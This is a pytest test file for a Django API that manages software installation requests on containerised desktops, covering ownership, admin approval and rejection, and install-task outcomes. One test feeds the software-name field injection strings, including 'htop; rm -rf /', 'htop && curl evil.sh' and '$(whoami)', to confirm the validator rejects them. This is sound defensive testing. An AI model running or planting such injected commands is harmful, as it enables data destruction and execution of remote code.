from unittest.mock import MagicMock, patch

import pytest
from django.urls import reverse
from rest_framework.test import APIClient

from apps.accounts.models import User, UserRole
from apps.events.models import EventLog, EventType
from apps.instances.models import DesktopInstance, InstanceStatus
from apps.software_requests.models import SoftwareRequest, SoftwareRequestStatus
from apps.templates.models import DesktopTemplate


def make_running_instance(user, name="Mine"):
    template, _ = DesktopTemplate.objects.get_or_create(
        name="Minimal", slug="minimal", defaults={"json_configuration": {"image": "desktop:minimal"}}
    )
    return DesktopInstance.objects.create(user=user, template=template, name=name, cpu_limit="2", memory_limit="2G", status=InstanceStatus.RUNNING)


def auth_client(user):
    client = APIClient(); client.force_authenticate(user)
    return client


@pytest.mark.django_db
def test_user_submits_request_for_own_instance():
    user = User.objects.create_user("owner", "owner@example.com", "SecurePass123!")
    instance = make_running_instance(user)
    client = auth_client(user)

    response = client.post(reverse("software-request-list"), {"instance_id": str(instance.id), "software_name": "htop", "justification": "Process monitoring"}, format="json")
    assert response.status_code == 201
    request = SoftwareRequest.objects.get()
    assert request.status == SoftwareRequestStatus.PENDING
    assert request.software_name == "htop"
    assert EventLog.objects.filter(actor=user, event_type=EventType.SOFTWARE_REQUESTED).exists()

    # Listed for the owner; details accessible
    listed = client.get(reverse("software-request-list"))
    assert len(listed.data["data"]["requests"]) == 1
    assert client.get(reverse("software-request-detail", kwargs={"request_id": str(request.id)})).status_code == 200


@pytest.mark.django_db
def test_submit_rejects_other_users_instances_and_bad_names():
    owner = User.objects.create_user("owner", "owner@example.com", "SecurePass123!")
    other = User.objects.create_user("other", "other@example.com", "SecurePass123!")
    instance = make_running_instance(owner)
    client = auth_client(other)

    response = client.post(reverse("software-request-list"), {"instance_id": str(instance.id), "software_name": "htop"}, format="json")
    assert response.status_code == 409

    client = auth_client(owner)
    for bad in ("htop; rm -rf /", "htop && curl evil.sh", "$(whoami)", "htop wget"):
        response = client.post(reverse("software-request-list"), {"instance_id": str(instance.id), "software_name": bad}, format="json")
        assert response.status_code == 400, bad
    assert not SoftwareRequest.objects.exists()


@pytest.mark.django_db
def test_admin_sees_all_and_can_filter_by_status():
    owner = User.objects.create_user("owner", "owner@example.com", "SecurePass123!")
    admin = User.objects.create_user("admin", "admin@example.com", "SecurePass123!", role=UserRole.ADMIN)
    instance = make_running_instance(owner)
    auth_client(owner).post(reverse("software-request-list"), {"instance_id": str(instance.id), "software_name": "htop"}, format="json")
    other_instance = make_running_instance(owner, name="Second")
    auth_client(owner).post(reverse("software-request-list"), {"instance_id": str(other_instance.id), "software_name": "vim"}, format="json")
    SoftwareRequest.objects.update(status=SoftwareRequestStatus.REJECTED)

    admin_client = auth_client(admin)
    assert len(admin_client.get(reverse("software-request-list")).data["data"]["requests"]) == 2
    pending = admin_client.get(reverse("software-request-list") + "?status=PENDING")
    assert len(pending.data["data"]["requests"]) == 0
    # Regular user still sees only their own
    owner_client = auth_client(owner)
    assert len(owner_client.get(reverse("software-request-list")).data["data"]["requests"]) == 2


@pytest.mark.django_db
def test_approve_and_require_admin_and_pending():
    owner = User.objects.create_user("owner", "owner@example.com", "SecurePass123!")
    admin = User.objects.create_user("admin", "admin@example.com", "SecurePass123!", role=UserRole.ADMIN)
    instance = make_running_instance(owner)
    request = SoftwareRequest.objects.create(user=owner, instance=instance, software_name="htop")
    url = reverse("software-request-approve", kwargs={"request_id": str(request.id)})

    # Regular users cannot approve
    assert auth_client(owner).post(url, format="json").status_code == 403

    # Admin approves → dispatch + APPROVED + event
    with patch("tasks.software_installation.install_software_task.delay") as delay:
        response = auth_client(admin).post(url, format="json")
        assert response.status_code == 200
        delay.assert_called_once_with(str(request.id))
    request.refresh_from_db()
    assert request.status == SoftwareRequestStatus.APPROVED
    assert request.reviewed_by == admin
    assert request.reviewed_at is not None
    assert EventLog.objects.filter(event_type=EventType.SOFTWARE_REQUEST_APPROVED).exists()

    # Approving twice conflicts
    assert auth_client(admin).post(url, format="json").status_code == 409


@pytest.mark.django_db
def test_reject_requires_confirmation_flow_admin_and_pending():
    owner = User.objects.create_user("owner", "owner@example.com", "SecurePass123!")
    admin = User.objects.create_user("admin", "admin@example.com", "SecurePass123!", role=UserRole.ADMIN)
    instance = make_running_instance(owner)
    request = SoftwareRequest.objects.create(user=owner, instance=instance, software_name="vim")
    url = reverse("software-request-reject", kwargs={"request_id": str(request.id)})

    assert auth_client(owner).post(url, format="json").status_code == 403
    response = auth_client(admin).post(url, format="json")
    assert response.status_code == 200
    request.refresh_from_db()
    assert request.status == SoftwareRequestStatus.REJECTED
    assert EventLog.objects.filter(event_type=EventType.SOFTWARE_REQUEST_REJECTED).exists()
    # Rejecting again conflicts
    assert auth_client(admin).post(url, format="json").status_code == 409


@pytest.mark.django_db
def test_installation_task_installs_and_marks_installed():
    owner = User.objects.create_user("owner", "owner@example.com", "SecurePass123!")
    instance = make_running_instance(owner)
    request = SoftwareRequest.objects.create(user=owner, instance=instance, software_name="htop")

    with patch("docker_manager.manager.docker_manager.install_software") as install_mock:
        from tasks.software_installation import install_software_task
        install_software_task(str(request.id))
        install_mock.assert_called_once()

    request.refresh_from_db()
    assert request.status == SoftwareRequestStatus.INSTALLED
    assert EventLog.objects.filter(event_type=EventType.SOFTWARE_INSTALLED).exists()


@pytest.mark.django_db
def test_installation_failure_marks_failed():
    owner = User.objects.create_user("owner", "owner@example.com", "SecurePass123!")
    instance = make_running_instance(owner)
    request = SoftwareRequest.objects.create(user=owner, instance=instance, software_name="not-a-real-package")

    from docker_manager.manager import DockerManagerError
    with patch("docker_manager.manager.docker_manager.install_software", side_effect=DockerManagerError("apt failed")):
        from tasks.software_installation import install_software_task
        with pytest.raises(DockerManagerError):
            install_software_task(str(request.id))

    request.refresh_from_db()
    assert request.status == SoftwareRequestStatus.FAILED
    assert EventLog.objects.filter(event_type=EventType.SOFTWARE_INSTALL_FAILED).exists()


@pytest.mark.django_db
def test_installation_failure_for_stopped_container_marks_failed():
    owner = User.objects.create_user("owner", "owner@example.com", "SecurePass123!")
    instance = make_running_instance(owner)
    request = SoftwareRequest.objects.create(user=owner, instance=instance, software_name="htop")
    instance.status = InstanceStatus.STOPPED
    instance.save(update_fields=["status"])

    from docker_manager.manager import DockerManagerError
    # The manager validates the container is running and rejects otherwise.
    with patch("docker_manager.manager.docker_manager.install_software", side_effect=DockerManagerError("container not running")):
        from tasks.software_installation import install_software_task
        with pytest.raises(DockerManagerError):
            install_software_task(str(request.id))

    request.refresh_from_db()
    assert request.status == SoftwareRequestStatus.FAILED
    assert EventLog.objects.filter(event_type=EventType.SOFTWARE_INSTALL_FAILED).exists()
